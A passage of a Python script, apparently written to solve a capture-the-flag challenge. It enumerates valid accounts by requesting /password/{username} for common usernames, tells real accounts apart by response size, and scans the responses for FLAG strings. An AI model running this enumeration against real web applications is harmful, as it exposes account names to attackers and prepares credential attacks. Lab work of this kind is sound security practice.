usernames = [
    'admin', 'user', 'root', 'guest', 'tester', 
    'administrator', 'system', 'api', 'service',
    'alice', 'bob', 'charlie', 'dave', 'eve',
    'trading', 'platform', 'support', 'help',
    'john', 'jane', 'mary', 'mike', 'sarah',
    'trader', 'manager', 'webmaster', 'owner',
    'demo', 'sample', 'example', 'default'
]

valid_accounts = []
for username in usernames:
    url = f"{target_url}/password/{username}"
    try:
        response = requests.get(url, timeout=5)
        size = len(response.content)
        
        if size == 1418:  # Matches valid account pattern
            # Extract username from hidden field
            username_match = re.search(r'name=["\']username["\'][^>]*value=["\']([^"\']+)["\']', response.text, re.I)
            if not username_match:
                username_match = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']username["\']', response.text, re.I)
            
            found_username = username_match.group(1) if username_match else "unknown"
            valid_accounts.append({'url': username, 'username': found_username})
            print(f"    [VALID] /password/{username} -> username field: {found_username}")
            
            # Check for flags
            if 'FLAG{' in response.text:
                print(f"    [!] FLAG FOUND in {username} response!")
                flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                if flag_match:
                    print(f"        {flag_match.group(0)}")
        elif size != 1287:
            print(f"    [DIFFERENT] /password/{username}: {size} bytes")
    except Exception as e:
        print(f"    [ERROR] /password/{username}: {e}")

# Print summary
print("\n" + "=" * 60)
print("[SUMMARY]")
print(f"  Valid accounts found: {len(valid_accounts)}")
if valid_accounts:
    for acc in valid_accounts:
        print(f"    - /password/{acc['url']} (user: {acc['username']})")
else:
    print("  No additional valid accounts found via common username fuzzing")

# Also check for flags in numeric ID responses
print("\n[4] Checking numeric IDs for embedded flags or secrets")
